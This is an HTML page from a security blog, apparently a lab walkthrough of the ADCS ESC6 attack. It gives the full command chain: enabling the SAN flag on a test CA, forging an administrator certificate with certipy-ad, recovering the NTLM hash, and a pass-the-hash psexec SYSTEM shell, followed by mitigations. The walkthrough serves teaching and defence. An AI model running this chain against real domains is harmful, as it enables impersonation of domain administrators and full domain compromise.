@@ -1,0 +1,104 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/active-directory-certificate-attack/" rel="category tag">Active Directory Certificate Attack</a></span>            </div>
+            <h1 class="post-title entry-title">ADCS ESC6: Editf_attributesubjectaltname2</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/esc6-editf_attributesubjectaltname2/" rel="bookmark"><time class="entry-date published" datetime="2025-05-21T10:44:25+00:00">May 21, 2025</time><time class="updated" datetime="2025-06-19T13:22:57+00:00">June 19, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000">The <strong>ESC6</strong> attack is a sophisticated <strong>privilege escalation</strong> technique that targets <strong>Active Directory Certificate Services (ADCS).</strong> By exploiting misconfigured certificate templates and overly permissive <strong>CA</strong> settings, attackers can stealthily acquire legitimate certificates to impersonate high-privilege accounts, such as <strong>Domain Admins</strong>, without resorting to exploits or brute force.</span></p>
+<p><span style="color: #000000">This attack takes advantage of trusted infrastructure and often evades detection. Moreover, it is enabled by insecure defaults, outdated configurations, and insufficient PKI oversight.</span></p>
+<h3><span style="color: #800000">Table of Content</span></h3>
+<ul>
+<li><span style="color: #000000"><strong>Overview of the ESC6 Attack</strong></span></li>
+<li><span style="color: #000000"><strong>EDITF_ATTRIBUTESUBJECTALTNAME2</strong><strong> flag</strong></span></li>
+<li><span style="color: #000000"><strong>Prerequisites</strong></span></li>
+<li><strong>Lab Setup</strong></li>
+</ul>
+<p><span style="color: #000000"><strong>Enumeration &amp; Exploitation </strong></span></p>
+<ul>
+<li><span style="color: #000000">Using Certipy-ad</span></li>
+</ul>
+<p><span style="color: #000000"><strong>Post Exploitation</strong></span></p>
+<ul>
+<li><span style="color: #000000">Lateral Movement &amp; Privilege Escalation using impacket-psexec</span></li>
+</ul>
+<p><span style="color: #000000"><strong>Mitigation </strong></span></p>
+<h3><span style="color: #800000">Overview of the ESC6 Attack</span></h3>
+<p><span style="color: #000000">ESC6 is a privilege escalation attack that exploits misconfigured certificate templates and CA settings. Consequently, it allows attackers to impersonate privileged users using legitimate certificates, bypassing brute-force or zero-day methods.</span></p>
+<p><span style="color: #000000">To understand the ESC6 attack, it’s important to examine the key components that enable it.</span></p>
+<ul>
+<li><span style="color: #000000"><strong>SAN Injection</strong>: ESC6 exploits the SAN request attribute (+EDITF_ATTRIBUTESUBJECTALTNAME2 flag) to add additional hostnames, typically used for webserver certificates.</span></li>
+<li><span style="color: #000000"><strong>CA-Wide Vulnerability</strong>: The flag applies globally, making any certificate template open to user enrollment exploitable.</span></li>
+<li><span style="color: #000000"><strong>Impersonating Privileged Users</strong>: Attackers can issue certificates with a Domain or Enterprise Admin as an additional UPN, impersonating high-privilege users.</span></li>
+<li><span style="color: #000000"><strong>Unprivileged User Enrollment</strong>: Attackers can enroll through open templates (e.g., standard User template) to authenticate as domain administrators or other privileged entities.</span></li>
+</ul>
+<h3><span style="color: #800000">EDITF_ATTRIBUTESUBJECTALTNAME2 flag</span></h3>
+<p><span style="color: #000000">The EDITF_ATTRIBUTESUBJECTALTNAME2 registry flag modifies CA behavior to allow certificate requesters to manually specify the Subject Alternative Name (SAN) field during enrollment.This includes identities like UPNs (e.g., administrator@ignite.local), DNS names, IPs, and email addresses. When enabled, it lets users inject custom SANs such as privileged UPNs making it a key enabler in ESC6 attacks.</span></p>
+<p><span style="color: #000000">In an ESC6 attack, this flag is crucial. When enabled, it lets attackers request certificates with a privileged user’s UPN. If combined with a misconfigured template, the CA issues a valid certificate, grant the attacker to impersonate and authenticate as that user.</span></p>
+<p><span style="color: #000000">By default, Active Directory auto-fills SAN fields based on the requester’s identity. However, with the flag enabled, requesters gain control over the SAN, thereby creating a path for abuse.</span></p>
+<p><span style="color: #000000"><em>Note: </em><em>If any domain user can supply a UPN, they can impersonate any account using a misconfigured certificate template, the core idea of the ESC6 exploit</em><em>.</em></span></p>
+<h3><span style="color: #800000">Prerequisite</span></h3>
+<ul>
+<li><span style="color: #000000">Windows Server 2019 as Active Directory that supports PKINIT</span></li>
+<li><span style="color: #000000">Domain must have Active Directory Certificate Services and Certificate Authority configured.</span></li>
+<li><span style="color: #000000">Kali Linux packed with tools</span></li>
+<li><span style="color: #000000">Tools: Impacket-psexec, certipy-ad</span></li>
+</ul>
+<h3><span style="color: #800000">Lab Setup</span></h3>
+<p><span style="color: #000000">In this guide, we skip the ADCS setup and foundational details covered earlier and dive straight into the ESC6 attack. We’ll demonstrate how misconfigured certificate templates, combined with insecure CA settings specifically the <strong>EDITF_ATTRIBUTESUBJECTALTNAME2</strong> registry flag that can be exploited by a low-privileged user to inject a privileged UPN into a certificate request.</span></p>
+<p><span style="color: #000000">This end-to-end walkthrough demonstrates how these weaknesses can ultimately lead to full domain compromise. Moreover, attackers can achieve this by using legitimate certificates.</span></p>
+<p data-start="0" data-end="194"><span style="color: #000000">Let’s walk through a practical scenario where an attacker compromises a low-privileged user account (<a class="cursor-pointer" style="color: #000000" rel="noopener" data-start="101" data-end="117">raj@ignite.local</a>). Then, the attacker identifies a misconfigured certificate template (User).</span></p>
+<p data-start="196" data-end="320" data-is-last-node="" data-is-only-node=""><span style="color: #000000">As a result, they escalate privileges to impersonate the Domain Administrator without ever needing to access their password.</span></p>
+<p><span style="color: #000000">From enabling the <strong>SAN injection flag</strong>, to crafting a <strong>malicious certificate request</strong>, and finally <strong>authenticating as the Domain Admin</strong>, we’ll break down every step using <strong>Certipy</strong> and <strong>Impacket-psexec</strong>, and show how this attack unfolds silently within trusted infrastructure.</span></p>
+<h4><span style="color: #000000">Identify Vulnerable Certificate Templates</span></h4>
+<p><span style="color: #000000">Our attack begins on the <strong>Certificate Authority (CA)</strong>. By inspecting the published templates, we find that the <strong>“User”</strong> template is available for issuance:</span></p>
+<p><span style="color: #000000"><img fetchpriority="high" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh_LsgFvA7KGcoFcgYwjDVQD6pEwdNzCoDk65ew0lhnnNeYn89y5qit1YjE6IUojxNhVOH13JJdQrwR0ZNsHNaVFPX92Vj-vrij2567f1dPzeXx8ouYkHInjK_OVpmpbXyZyS3_POdkpkM_LpwjSh9bb_npepbaiWHbk5kIXMRcT6A85VS80ovGBatE69sy/s16000/0.png" alt="ESC6 Active Directory attack" width="893" height="433"/></span></p>
+<p><span style="color: #000000"><strong><em> </em></strong></span></p>
+<p><span style="color: #000000"><strong><em>Note:</em></strong><em> The <strong>User</strong> template is intended for client authentication and is commonly used for features like S/MIME or EFS. However, if misconfigured, it becomes an ideal target for <strong>ESC6</strong> exploitation.</em></span></p>
+<h4><span style="color: #000000">Misconfigure the CA – Enable Subject Alternative Name Injection</span></h4>
+<p><span style="color: #000000">To make the “User” template vulnerable to ESC6, modify the CA registry to allow requesters to specify a custom SAN. As a result, this opens the door for user impersonation through crafted certificate requests.</span></p>
+<p><span style="color: #000000">On the CA, run the following commands:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">net stop certsvc</pre>
+<p><span style="color: #000000"><img decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj9AdbuybkFInDSyNUM3MyBleB0IJ9toDrWEI7xMK1hJLBAS7x_EWeHZ4W0i1QAQ1BSZinuvRLm9w6SfmEpEeOLMmEnYN-ZjV5wHrPi8b8KkzONmHlHOZ9q4WsvaLt7bY6Uf_RY5utG6Qw0PZ58s-UuNdUDjAza2Iw3nkHviBSNu1KPIxDeyn3KJbOyXvOD/s16000/1.png" alt="editF_AttributeSubjectAltName2 exploit, Active Directory certificate abuse" width="709" height="130"/></span></p>
+<p><span style="color: #000000">This Stops the Certificate Services (certsvc) to safely modify registry settings.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certutil -setreg policyEditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2</pre>
+<p><span style="color: #000000"><img decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgbtGBheHejyvJGzjcd-p8L3qGxqSxxjcW3pM9nxpbaPcXLqk0YLRiZym0mLB_YMJLWGHhqiugAm5Wb5Bu8v0s2xUOeRuLNeqqWOLOr2Y0TIrCe3d0nUCTfgaHlekyWQ3QvOg0UExXGZed0sn5tfW9cv2BGGaDHRRuPwY7IF-7f6Q_EVBalePd5ZQsFX55S/s16000/3.png" alt="ESC6 Active Directory attack" width="912" height="533"/></span></p>
+<p><span style="color: #000000">Finally, this enables the flag, grant custom SAN injections and exposing the CA to the ESC6 attack.</span></p>
+<p><span style="color: #000000"><strong><em>Note</em></strong><strong><em>:</em></strong><em> ESC6 attacks thrive on misconfigurations, disable the </em><em>EDITF_ATTRIBUTESUBJECTALTNAME2</em><em> flag using </em><em>certutil -setreg policyEditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2</em><em> to block custom SAN injection and mitigate the risk.</em></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">net start certsvc</pre>
+<p><span style="color: #000000">This restarts Certificate Services to apply the changes.</span></p>
+<p><span style="color: #000000"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh2C9m-yoNaYovoijBqKt3b4BrPk2t9zQ35iHFmdy6-QgsVG00CmTboT26DtLVRfSharoTkPB79MGcllJMlYA7sVWUZUw8kS651TSDU09JISbNuaUhePo9tdFkunnGvqwAgFED1sOgSCGl651Ulxi9QK_QLbNAB81C17Iokv0tY-6ZmzDthyphenhyphen6UFujOBNKES/s16000/4.png" alt="editF_AttributeSubjectAltName2 exploit" width="714" height="101"/></span></p>
+<p><span style="color: #000000">In short, the process stops the service, modifies the registry to enable the vulnerability, and then restarts the service to apply the changes.</span></p>
+<p><span style="color: #000000"><strong>Effect:</strong> Users can now impersonate any account by specifying a custom UPN (e.g., administrator@ignite.local) in their certificate request.</span></p>
+<h3><span style="color: #800000">Enumeration &amp; Exploitation </span></h3>
+<h4><span style="color: #800000">Using Certipy-ad</span></h4>
+<p><span style="color: #000000"><strong>Certipy-AD</strong> is a tool used to enumerate and exploit misconfigurations in ADCS, making it especially effective for automating ESC6 attacks involving forged certificates and privilege escalation.</span></p>
+<h5><span style="color: #000000"><strong>Request a Malicious Certificate as a Low-Privilege User</strong></span></h5>
+<p><span style="color: #000000">With the template vulnerable, the attacker (user raj) requests a certificate claiming to be the <strong>Domain Admin</strong>:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad req -u raj@ignite.local -p Password@1 -target 192.168.1.48 -ca ignite-DC-CA- -template User -upn administrator@ignite.local -dc-ip 192.168.1.48</pre>
+<p><span style="color: #000000"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiRZxuuV0YilyAXMDiRzfzaWC3Wnz_atPkekMCQ4liCQSrtfPj8iPLf7Y0FfKqkV1Yjd1w-G5_4xhvm4kFUz7XTxCNezfDIIr4H7zd8kHfdBPgHRueQMRxCWZ1qG_yKgverGMOSdKaScxXwAHclI430yS81MiHPXetLJtbT0mGzReEsFL4Hk3pXbVZxuyP0/s16000/5.png" alt="ESC6 Active Directory attack" width="967" height="249"/></span></p>
+<p><span style="color: #000000">Finally, this generates a .pfx certificate file that authenticates as administrator.</span></p>
+<h5><span style="color: #000000"><strong>Authenticate as Domain Admin Using the Certificate</strong></span></h5>
+<p><span style="color: #000000">Now that we have a valid certificate for administrator. We can use <a href="https://github.com/ly4k/Certipy">Certipy</a> to authenticate and gain access as Domain Admin:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.1.48</pre>
+<p><span style="color: #000000"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhWvt_BjL9O7FIdwiBEgh0F_srO1pJseu_BboHLSEiMDET2NuG_BL4qcJO2AX5eIkC8a5CrMDiWkQ4XP9xQhLUS8T-7gFCuhuWTvEu3wlaFkL49zsHd2qzpqVnKFD5h31ml3YVNbFtu1RYUJLl1FePmHxta6G4IOdEPc189gvEgC3Pgvlm7bOUQykgNOrLu/s16000/6.png" alt="editF_AttributeSubjectAltName2 exploit" width="1152" height="220"/></span></p>
+<p><span style="color: #000000">Finally, this dumps the NTLM hashes in the session, grant us to authenticate as the targeted user.</span></p>
+<h3><span style="color: #800000">Post Exploitation</span></h3>
+<h5><span style="color: #000000"><strong>Lateral Movement &amp; Privilege Escalation using impacket-psexec</strong></span></h5>
+<p><span style="color: #000000">Use Impacket’s psexec to spawn a SYSTEM shell on remote machines via SMB.</span></p>
+<p><span style="color: #000000">Run the command</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-psexec ignite.local/administrator@ignite.local -hashes :32196b56ffe6f45e294117b91a83bf38</pre>
+<p><span style="color: #000000"><em> <img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg0aAhBOppJdmxW-mhvhpRKvsYegMYJCFeUpruYDtEI_Du6SDjJb8P_UeRNbg21prMf3iaiyjjMeSDWd6zDD5FazB_HcYBdH3ijE27LGmhvJoYE45ZT6iboD74CkviOeUbZpOPjwZ4RoVE0Xq0kGHZweAEHTARRUL2jFv6M5CGFGourshll_19dJcfPn3sZ/s16000/7.png" alt="ESC6 Active Directory attack" width="1100" height="320"/></em></span></p>
+<h3><span style="color: #800000">Mitigation</span></h3>
+<ul>
+<li><span style="color: #000000"><strong>Disable</strong> EDITF_ATTRIBUTESUBJECTALTNAME2 unless strictly necessary.</span></li>
+<li><span style="color: #000000"><strong>Restrict enrollment rights</strong> on certificate templates.</span></li>
+<li><span style="color: #000000"><strong>Monitor</strong> cert requests with not normal SAN/UPN values.</span></li>
+<li><span style="color: #000000">Use tools like <strong>Certipy</strong> to audit ADCS.</span></li>
+</ul>
+<p><span style="color: #000000">To learn more about Active Directory Certification Attack. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/active-directory-certificate-attack/">Link.</a></strong></p>
+<p><span style="color: #000000"><strong>Author: </strong>MD Aslam is a dynamic Information Security leader committed to driving security excellence and mentoring teams to strengthen security across products, networks, and organizations. Contact</span> <strong><a href="https://www.linkedin.com/in/md-aslam-7b04ab144">here</a></strong></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
